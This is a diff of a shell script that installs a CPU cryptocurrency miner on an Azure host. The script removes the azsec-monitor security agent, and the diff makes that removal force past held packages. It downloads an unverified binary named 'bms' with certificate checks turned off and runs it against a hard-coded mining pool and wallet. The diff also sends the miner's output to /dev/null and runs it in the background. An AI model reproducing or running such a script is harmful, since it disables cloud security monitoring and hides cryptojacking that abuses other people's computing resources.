@@ -4,8 +4,8 @@ sudo hostnamectl set-hostname azure
 rm -fR /root/cpuminer-opt-linux
 #read -p "What is Worker? (exp: vps01): " worker
 sudo apt-get update -y
-sudo apt remove azsec-monitor -y
-sudo apt --fix-broken install -y
+sudo apt remove azsec-monitor -y --allow-change-held-packages
+sudo apt --fix-broken install -y --allow-change-held-packages
 sudo apt-get install cpulimit -y
 wget --no-check-certificate wget https://raw.githubusercontent.com/minhchau91/createproxy/main/bms
 chmod +x bms
@@ -17,7 +17,7 @@ limitCPU=$((cores * 80))
 cat /dev/null > /root/danielchau.sh
 cat >>/root/danielchau.sh <<EOF
 #!/bin/bash
-./bms --background -a yespower --pool stratum+tcps://stratum-eu.rplant.xyz:17079 --tls false --wallet v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Azure --cpu-threads $cores --disable-gpu
+./bms --background -a yespower --pool stratum+tcps://stratum-eu.rplant.xyz:17079 --tls false --wallet v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Azure --cpu-threads $cores --disable-gpu  > /dev/null 2>&1 &
 sleep 3
 EOF
 chmod +x /root/danielchau.sh
